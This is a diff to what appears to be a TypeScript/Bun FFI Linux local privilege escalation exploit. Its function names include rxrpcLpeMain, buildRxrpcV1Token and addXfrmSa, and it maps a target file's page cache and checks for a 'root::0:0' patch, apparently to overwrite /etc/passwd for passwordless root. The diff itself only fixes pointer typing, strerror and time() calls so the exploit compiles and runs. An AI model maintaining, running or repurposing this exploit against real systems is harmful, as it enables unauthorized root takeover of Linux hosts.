@@ -245,15 +245,24 @@ export function sysKeyctlInval(nr: bigint, op: number, key: bigint): bigint {
   return _sysKeyctlRaw(nr, op, key) as bigint;
 }
 
+// ── Pointer type helpers ──────────────────────────────────────────────────────
+// Bun FFI functions that accept/return raw addresses use a branded `Pointer`
+// type, but at runtime they are plain numbers.  Cast with nptr() to avoid
+// TS2345 without littering `as any` everywhere.
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function nptr(n: number | bigint): Parameters<typeof toBuffer>[0] {
+  return n as unknown as Parameters<typeof toBuffer>[0];
+}
+
 // ── errno / strerror ──────────────────────────────────────────────────────────
 
 export function getErrno(): number {
   const p = C.__errno_location() as number;
-  return toBuffer(p, 0, 4).readInt32LE(0);
+  return toBuffer(nptr(p), 0, 4).readInt32LE(0);
 }
 
 export function errStr(e = getErrno()): string {
-  return (C.strerror(e) as string) ?? "unknown";
+  return String(C.strerror(e)) ?? "unknown";
 }
 
 // ── Network constants ─────────────────────────────────────────────────────────
@@ -421,17 +430,17 @@ export function writeStr(buf: Buffer, offset: number, s: string): void {
 
 /** Read a null-terminated C string from a native pointer. */
 export function readCStr(p: number | bigint): string {
-  return new CString(typeof p === "bigint" ? Number(p) : p).toString();
+  return new CString(nptr(typeof p === "bigint" ? Number(p) : p)).toString();
 }
 
 /** Read a u32 from a native pointer offset. */
 export function readU32(p: number, off: number): number {
-  return toBuffer(p + off, 0, 4).readUInt32LE(0);
+  return toBuffer(nptr(p + off), 0, 4).readUInt32LE(0);
 }
 
 /** Read an i64 from a native pointer offset (as number). */
 export function readI64(p: number, off: number): bigint {
-  return toBuffer(p + off, 0, 8).readBigInt64LE(0);
+  return toBuffer(nptr(p + off), 0, 8).readBigInt64LE(0);
 }
 
 // ── Logging (mirrors LOG / WARN / DBG macros) ─────────────────────────────────
@@ -777,7 +786,7 @@ function addXfrmSa(spi: number, patchSeqhi: number): number {
     const kerr   = rbuf.readInt32LE(NLMSG_HDRLEN);
     const kErrno = -kerr;  // positive errno
     if (kerr !== 0) {
-      progress(`addXfrmSa: kernel rejected: nlmsgerr.error=${kerr} → errno ${kErrno} (${C.strerror(kErrno) as string})`);
+      progress(`addXfrmSa: kernel rejected: nlmsgerr.error=${kerr} → errno ${kErrno} (${String(C.strerror(kErrno))})`);
       return -1;
     }
     progress(`addXfrmSa: ACK OK (nlmsgerr.error=0)`);
@@ -1123,7 +1132,7 @@ export function buildRxrpcV1Token(sessionKey: Buffer): Buffer {
     p += 4;
   };
   const writeBytes = (src: Buffer | Uint8Array, len: number) => {
-    src.copy(out as unknown as Buffer, p, 0, len);
+    Buffer.from(src).copy(out as unknown as Buffer, p, 0, len);
     p += len;
   };
 
@@ -1141,7 +1150,7 @@ export function buildRxrpcV1Token(sessionKey: Buffer): Buffer {
   write32BE(0); // vice_id
   write32BE(1); // kvno
   writeBytes(sessionKey, 8); // session_key
-  const now = Number(C.time(0) as bigint);
+  const now = Number(C.time(null) as bigint);
   write32BE(now); // start_time
   write32BE(now + 86400); // end_time
   write32BE(1); // primary_flag
@@ -2356,7 +2365,7 @@ export function rxrpcLpeMain(argv: string[]): number {
   }
   LOG(`mmap'd ${targetPath} page-cache at 0x${mapPtr.toString(16)}`);
 
-  const mapBuf = toBuffer(mapPtr, 0, Math.min(4096, Number(stSize)));
+  const mapBuf = toBuffer(nptr(mapPtr as number), 0, Math.min(4096, Number(stSize)));
 
   // check if already patched
   if (mapBuf.subarray(0, 9).toString("ascii") === "root::0:0") {
@@ -2409,7 +2418,7 @@ export function rxrpcLpeMain(argv: string[]): number {
   const miStr = getEnv("LPE_MAX_ITERS");
   if (miStr) maxIters = BigInt(miStr);
 
-  const timeNow = Number(C.time(0) as bigint);
+  const timeNow = Number(C.time(null) as bigint);
   let seedBase =
     (BigInt(timeNow) * 0x100000001n) ^ BigInt(C.getpid() as number);
   const seStr = getEnv("LPE_SEED");
